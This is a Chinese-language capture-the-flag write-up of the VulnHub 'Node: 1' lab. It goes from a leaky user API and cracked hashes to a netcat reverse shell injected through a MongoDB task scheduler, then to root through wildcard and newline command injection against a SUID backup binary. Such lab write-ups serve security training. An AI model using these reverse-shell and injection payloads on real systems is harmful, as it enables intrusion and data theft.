# Node: 1

2024-5-2 https://www.vulnhub.com/entry/node-1,252/

difficulty: medium

## IP

192.168.5.25

## Scan

Open Port -> 22,3000

```
PORT     STATE SERVICE         VERSION
22/tcp   open  ssh             OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 dc5e34a625db43eceb40f4967b8ed1da (RSA)
|   256 6c8e5e5f4fd5417d1895d1dc2e3fe59c (ECDSA)
|_  256 d878b85d85ffad7be6e2b5da1e526236 (ED25519)
3000/tcp open  hadoop-datanode Apache Hadoop
|_http-title: MyPlace
| hadoop-tasktracker-info:
|_  Logs: /login
| hadoop-datanode-info:
|_  Logs: /login
```

22 ssh 匿名没显示任何 banner 信息。

3000 端口看看页面显示什么内容，是一个网站的页面，看到是 Express 的后台服务，目录扫描时有些问题，可能是后台服务做了某些限制，不能进行目录扫描。

根据底部显示的内容，提示让我们查看用户资料：

```
Sign ups are closed whilst we finish up development, but feel free to take a look at the profiles of our existing users.
```

所以分别点开查看 3 个用户的信息，并观察返回的数据包情况，发现有数据泄露的情况：

```
{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false}
{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false}
{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}
```

我们得到了 3 个用户的密码信息，看密码的格式像 md5，尝试在 md5 相关网站找到明文密码。tom:spongebob、mark:snowflake，rastating 的密码没有找到。

尝试用找到的密码登陆网站，tom 和 mark 都不是网站的管理员，登陆后没有任何可以操作的权限，提示我们寻找管理员用户。

这里根据上面的返回结果，需要我们找到管理员权限的用户才可以看到管理 panel，发现 http://192.168.5.25:3000/profiles/tom 用户的资料访问这里可以存在用户遍历，尝试用 FUZZ 找到有 admin 权限的用户，使用了大的用户名字典，但是没有找到其他的用户名信息。

上面的方法都不能找到管理员的用户名，再次回顾网页中的请求。在查看用户详细信息时调用了 /api/users/tom 这个接口，根据程序开发的习惯，让我们尝试把后面的具体用户名去掉，看看能不能获得更多信息。

```
curl http://192.168.5.25:3000/api/users

[{"_id":"59a7365b98aa325cc03ee51c","username":"myP14ceAdm1nAcc0uNT","password":"dffc504aa55359b9265cbebe1e4032fe600b64475ae3fd29c07d23223334d0af","is_admin":true},{"_id":"59a7368398aa325cc03ee51d","username":"tom","password":"f0e2e750791171b0391b682ec35835bd6a5c3f7c8d1d0191451ec77b4d75f240","is_admin":false},{"_id":"59a7368e98aa325cc03ee51e","username":"mark","password":"de5a1adf4fedcce1533915edc60177547f1057b61b7119fd130e1f7428705f73","is_admin":false},{"_id":"59aa9781cced6f1d1490fce9","username":"rastating","password":"5065db2df0d4ee53562c650c29bacf55b97e231e3fe88570abc9edd8b78ac2f0","is_admin":false}]
```

第一个用户就是 admin 权限用户，在 md5 网站找到了明文密码：manchester。再次登陆，页面上显示了一个 backup 下载按钮，下载后是一个名为 myplace.backup 的文件。

先用 file 看看文件是什么类型的，是一个 ASCII text 文本文件，但是提示内容非常大，用 less 进行查看，好像内容是 base64 编码的，先把文件解码，在看看是什么文件：

```
cat  myplace.backup | base64 -d > backup
file backup

backup: Zip archive data, at least v1.0 to extract, compression method=store
```

是 zip ，继续解压，但是发现解压时需要密码，先使用 john 转换，然后再进行破解。

```
zip2john backup > hash
john hash --wordlist=~/tools/dict/rockyou.txt
```

得到压缩包的密码：magicword

解压后，在 app.js 文件中得到了相关 api 调用的信息：

找到了扫描器不能使用的原因，UA 在黑名单中

```
var blacklist = /(DirBuster)|(Postman)|(Mozilla\/4\.0.+Windows NT 5\.1)|(Go\-http\-client)/i;
```

发现了数据库的连接信息：

```js
const url = "mongodb://mark:5AYRft73VtFpc84k@localhost:27017/myplace?authMechanism=DEFAULT&authSource=myplace";

mongodb://[username:password@]host1[:port1][,host2[:port2],...[,hostN[:portN]]][/[database][?options]]
```

尝试使用此凭证 mark:5AYRft73VtFpc84k 进行 ssh 登陆，登陆成功。

在 /etc/passwd 中找到了 3 个有用的用户：

```
root:x:0:0:root:/root:/bin/bash
tom:x:1000:1000:tom,,,:/home/tom:/bin/bash
mark:x:1001:1001:Mark,,,:/home/mark:/bin/bash
```

在 /home/tom 中发现了 user.txt ，但是没有权限去读取，要切换到 tom 用户。

查看系统以 tom 用户运行的进程：

```
mark@node:~$ ps -ef |grep tom
tom       1175     1  0 08:51 ?        00:00:47 /usr/bin/node /var/www/myplace/app.js
tom       1176     1  0 08:51 ?        00:00:02 /usr/bin/node /var/scheduler/app.js
```

查看 /var/scheduler/app.js 的内容：

```js
const exec = require("child_process").exec;
const MongoClient = require("mongodb").MongoClient;
const ObjectID = require("mongodb").ObjectID;
const url = "mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler?authMechanism=DEFAULT&authSource=scheduler";

MongoClient.connect(url, function (error, db) {
    if (error || !db) {
        console.log("[!] Failed to connect to mongodb");
        return;
    }

    setInterval(function () {
        db.collection("tasks")
            .find()
            .toArray(function (error, docs) {
                if (!error && docs) {
                    docs.forEach(function (doc) {
                        if (doc) {
                            console.log("Executing task " + doc._id + "...");
                            exec(doc.cmd);
                            db.collection("tasks").deleteOne({ _id: new ObjectID(doc._id) });
                        }
                    });
                } else if (error) {
                    console.log("Something went wrong: " + error);
                }
            });
    }, 30000);
});
```

发现程序定时 30 秒从数据库中取出指令，然后执行。

使用之前的 ssh 凭据登陆后，在目标机器中连接本地 mongodb：

```
mongo "mongodb://mark:5AYRft73VtFpc84k@localhost:27017/scheduler"

db.tasks.find()
db.tasks.insertOne({'cmd': 'echo tom > /tmp/tom.txt'})
db.tasks.find()
```

先做个运行测试，可以看到定时任务程序执行后，/tmp/tom.txt 中有 tom，表明执行成功。

下面开始将我们的反弹 shell 写入到数据库中，kali 上监听 8888 端口：

```
db.tasks.insertOne({'cmd': 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.5.10 8888 >/tmp/f'})
```

等待定时器调用命令，在 kali 上得到了反弹的 shell，先用 python 升级 tty。

查看到 user.txt：

```
tom@node:~$ cat user.txt
e1156acc3574e04b06908ecf76be91b1
```

继续寻找提升到 root 权限的路径。

tom 用户我们没有密码，没法查看 sudo，其他密码信息也没有搜索到，查询 SUID 程序，发现一个不是系统自带的：/usr/local/bin/backup

这个程序，在我们最开始得到的 app.js 中有调用：

```
const backup_key  = '45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474';
var proc = spawn('/usr/local/bin/backup', ['-q', backup_key, __dirname ]);
```

那么我们就可以用这个 suid，把/root 目录中的所有信息都转储出来，下面进行尝试：

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /root

UEsDBDMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAcm9vdC50eHQBmQcAAgBBRQEIAEbBKBl0rFrayqfbwJ2YyHunnYq1Za6G7XLo8C3RH/hu0fArpSvYauq4AUycRmLuWvPyJk3sF+HmNMciNHfFNLD3LdkGmgwSW8j50xlO6SWiH5qU1Edz340bxpSlvaKvE4hnK/oan4wWPabhw/2rwaaJSXucU+pLgZorY67Q/Y6cfA2hLWJabgeobKjMy0njgC9c8cQDaVrfE/ZiS1S+rPgz/e2Pc3lgkQ+lAVBqjo4zmpQltgIXauCdhvlA1Pe/BXhPQBJab7NVF6Xm3207EfD3utbrcuUuQyF+rQhDCKsAEhqQ+Yyp1Tq2o6BvWJlhtWdts7rCubeoZPDBD6Mejp3XYkbSYYbzmgr1poNqnzT5XPiXnPwVqH1fG8OSO56xAvxx2mU2EP+Yhgo4OAghyW1sgV8FxenV8p5c+u9bTBTz/7WlQDI0HUsFAOHnWBTYR4HTvyi8OPZXKmwsPAG1hrlcrNDqPrpsmxxmVR8xSRbBDLSrH14pXYKPY/a4AZKO/GtVMULlrpbpIFqZ98zwmROFstmPl/cITNYWBlLtJ5AmsyCxBybfLxHdJKHMsK6Rp4MO+wXrd/EZNxM8lnW6XNOVgnFHMBsxJkqsYIWlO0MMyU9L1CL2RRwm2QvbdD8PLWA/jp1fuYUdWxvQWt7NjmXo7crC1dA0BDPg5pVNxTrOc6lADp7xvGK/kP4F0eR+53a4dSL0b6xFnbL7WwRpcF+Ate/Ut22WlFrg9A8gqBC8Ub1SnBU2b93ElbG9SFzno5TFmzXk3onbLaaEVZl9AKPA3sGEXZvVP+jueADQsokjJQwnzg1BRGFmqWbR6hxPagTVXBbQ+hytQdd26PCuhmRUyNjEIBFx/XqkSOfAhLI9+Oe4FH3hYqb1W6xfZcLhpBs4Vwh7t2WGrEnUm2/F+X/OD+s9xeYniyUrBTEaOWKEv2NOUZudU6X2VOTX6QbHJryLdSU9XLHB+nEGeq+sdtifdUGeFLct+Ee2pgR/AsSexKmzW09cx865KuxKnR3yoC6roUBb30Ijm5vQuzg/RM71P5ldpCK70RemYniiNeluBfHwQLOxkDn/8MN0CEBr1eFzkCNdblNBVA7b9m7GjoEhQXOpOpSGrXwbiHHm5C7Zn4kZtEy729ZOo71OVuT9i+4vCiWQLHrdxYkqiC7lmfCjMh9e05WEy1EBmPaFkYgxK2c6xWErsEv38++8xdqAcdEGXJBR2RT1TlxG/YlB4B7SwUem4xG6zJYi452F1klhkxloV6paNLWrcLwokdPJeCIrUbn+C9TesqoaaXASnictzNXUKzT905OFOcJwt7FbxyXk0z3FxD/tgtUHcFBLAQI/AzMDAQBjAG++IksAAAAA7QMAABgKAAAIAAsAAAAAAAAAIIC0gQAAAAByb290LnR4dAGZBwACAEFFAQgAUEsFBgAAAAABAAEAQQAAAB4EAAAAAA==
```

将得到的内容保存在 txt 中，然后使用 base64 -d 进行解码，然后看到文件是一个 zip 格式，继续进行解压，解压密码使用前面爆破出来的：magicword

最终解压出一个/root.txt 文件吗，一个嘲笑图：

```
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQQQQQWQQQQQWWWBBBHHHHHHHHHBWWWQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQQQD!`__ssaaaaaaaaaass_ass_s____.  -~""??9VWQQQQQQQQQQQQQQQQQQQ
QQQQQQQQQQQQQP'_wmQQQWWBWV?GwwwmmWQmwwwwwgmZUVVHAqwaaaac,"?9$QQQQQQQQQQQQQQ
QQQQQQQQQQQW! aQWQQQQW?qw#TTSgwawwggywawwpY?T?TYTYTXmwwgZ$ma/-?4QQQQQQQQQQQ
QQQQQQQQQQW' jQQQQWTqwDYauT9mmwwawww?WWWWQQQQQ@TT?TVTT9HQQQQQQw,-4QQQQQQQQQ
QQQQQQQQQQ[ jQQQQQyWVw2$wWWQQQWWQWWWW7WQQQQQQQQPWWQQQWQQw7WQQQWWc)WWQQQQQQQ
QQQQQQQQQf jQQQQQWWmWmmQWU???????9WWQmWQQQQQQQWjWQQQQQQQWQmQQQQWL 4QQQQQQQQ
QQQQQQQP'.yQQQQQQQQQQQP"       <wa,.!4WQQQQQQQWdWP??!"??4WWQQQWQQc ?QWQQQQQ
QQQQQP'_a.<aamQQQW!<yF "!` ..  "??$Qa "WQQQWTVP'    "??' =QQmWWV?46/ ?QQQQQ
QQQP'sdyWQP?!`.-"?46mQQQQQQT!mQQgaa. <wWQQWQaa _aawmWWQQQQQQQQQWP4a7g -WWQQ
QQ[ j@mQP'adQQP4ga, -????" <jQQQQQWQQQQQQQQQWW;)WQWWWW9QQP?"`  -?QzQ7L ]QQQ
QW jQkQ@ jWQQD'-?$QQQQQQQQQQQQQQQQQWWQWQQQWQQQc "4QQQQa   .QP4QQQQfWkl jQQQ
QE ]QkQk $D?`  waa "?9WWQQQP??T?47`_aamQQQQQQWWQw,-?QWWQQQQQ`"QQQD\Qf(.QWQQ
QQ,-Qm4Q/-QmQ6 "WWQma/  "??QQQQQQL 4W"- -?$QQQQWP`s,awT$QQQ@  "QW@?$:.yQQQQ
QQm/-4wTQgQWQQ,  ?4WWk 4waac -???$waQQQQQQQQF??'<mWWWWWQW?^  ` ]6QQ' yQQQQQ
QQQQw,-?QmWQQQQw  a,    ?QWWQQQw _.  "????9VWaamQWV???"  a j/  ]QQf jQQQQQQ
QQQQQQw,"4QQQQQQm,-$Qa     ???4F jQQQQQwc <aaas _aaaaa 4QW ]E  )WQ`=QQQQQQQ
QQQQQQWQ/ $QQQQQQQa ?H ]Wwa,     ???9WWWh dQWWW,=QWWU?  ?!     )WQ ]QQQQQQQ
QQQQQQQQQc-QWQQQQQW6,  QWQWQQQk <c                             jWQ ]QQQQQQQ
QQQQQQQQQQ,"$WQQWQQQQg,."?QQQQ'.mQQQmaa,.,                . .; QWQ.]QQQQQQQ
QQQQQQQQQWQa ?$WQQWQQQQQa,."?( mQQQQQQW[:QQQQm[ ammF jy! j( } jQQQ(:QQQQQQQ
QQQQQQQQQQWWma "9gw?9gdB?QQwa, -??T$WQQ;:QQQWQ ]WWD _Qf +?! _jQQQWf QQQQQQQ
QQQQQQQQQQQQQQQws "Tqau?9maZ?WQmaas,,    --~-- ---  . _ssawmQQQQQQk 3QQQQWQ
QQQQQQQQQQQQQQQQWQga,-?9mwad?1wdT9WQQQQQWVVTTYY?YTVWQQQQWWD5mQQPQQQ ]QQQQQQ
QQQQQQQWQQQQQQQQQQQWQQwa,-??$QwadV}<wBHHVHWWBHHUWWBVTTTV5awBQQD6QQQ ]QQQQQQ
QQQQQQQQQQQQQQQQQQQQQQWWQQga,-"9$WQQmmwwmBUUHTTVWBWQQQQWVT?96aQWQQQ ]QQQQQQ
QQQQQQQQQQWQQQQWQQQQQQQQQQQWQQma,-?9$QQWWQQQQQQQWmQmmmmmQWQQQQWQQW(.yQQQQQW
QQQQQQQQQQQQQWQQQQQQWQQQQQQQQQQQQQga%,.  -??9$QQQQQQQQQQQWQQWQQV? sWQQQQQQQ
QQQQQQQQQWQQQQQQQQQQQQQQWQQQQQQQQQQQWQQQQmywaa,;~^"!???????!^`_saQWWQQQQQQQ
QQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQQWWWWQQQQQmwywwwwwwmQQWQQQQQQQQQQQ
QQQQQQQWQQQWQQQQQQWQQQWQQQQQWQQQQQQQQQQQQQQQQWQQQQQWQQQWWWQQQQQQQQQQQQQQQWQ
```

让我们看看能不能继续得到 /etc/shadow ，能不能在最后那个参数上做点文章：

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /etc
```

但是得到的 /etc 目录的结果和 /root 是一样的，根据 strings 查看结果，推测应该是 backup 程序中做了某些限制，就是程序中的预设字符串：

```
/root
/etc
/tmp/.backup_%i
/usr/bin/zip -r -P magicword %s %s > /dev/null
/usr/bin/base64 -w0 %s
```

进一步 使用 ltrace 查看函数调用情况，能更清楚的看到程序的逻辑：

```
fgets(nil, 1000, 0x9b43008)                      = 0
strstr("/tmp/a", "..")                           = nil
strstr("/tmp/a", "/root")                        = nil
strchr("/tmp/a", ';')                            = nil
strchr("/tmp/a", '&')                            = nil
strchr("/tmp/a", '`')                            = nil
strchr("/tmp/a", '$')                            = nil
strchr("/tmp/a", '|')                            = nil
strstr("/tmp/a", "//")                           = nil
strcmp("/tmp/a", "/")                            = 1
```

这里看到程序中对特殊字符和目录都进行了判断，&、; 、` 等特殊字符都不能使用。针对上面的限制，下面开始进行绕过。

### 获取 root flag 的方式 1：

使用通配符，绕过上面程序的限制：

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 /ro?t/ro?t.txt

UEsDBAoACQAAANR9I0vyjjdALQAAACEAAAANABwAcm9vdC9yb290LnR4dFVUCQAD0BWsWeAVrFl1eAsAAQQAAAAABAAAAAC671VKgwdw3u5/RR2lhRKFf46khNiCUWpyHwxHVm9hNvK/Sn8tCv+0Vae1VWxQSwcI8o43QC0AAAAhAAAAUEsBAh4DCgAJAAAA1H0jS/KON0AtAAAAIQAAAA0AGAAAAAAAAQAAAKCBAAAAAHJvb3Qvcm9vdC50eHRVVAUAA9AVrFl1eAsAAQQAAAAABAAAAABQSwUGAAAAAAEAAQBTAAAAhAAAAAAA

将上面的结果保存在bk文本文件中。
cat bk | base64 -d > bk.zip

unzip bk.zip -d . 输入密码magicword

得到/root/root.txt

1722e99ca5f353b362556a62bd5e6be0
```

### 获取 root 方式 2：

将执行的命令带入到最后的参数中，利用 \n 绕过限制执行命令：

```
/usr/local/bin/backup -q 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 "$(echo -e '\n/bin/bash\necho 1')"
```

由于目标系统对外的开放端口只有 22 和 3000，mongodb 的 27017 端口不能外连，需要借助端口转发才可以，可以借助我们获得的 ssh 会话进行端口转发，在 kali 上执行：

```
ssh -N -L 27017:localhost:27017 mark@192.168.5.25
```

### 获取 root 方式 3：

目标系统内核版本为：4.4.0，通过搜索可以使用下面的内核漏洞利用代码：

```
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation  | linux/local/44298.c
```

将 c 源代码传输到目标机器后，使用 gcc 进行编译，运行编译后的 exp，得到了 root 权限。
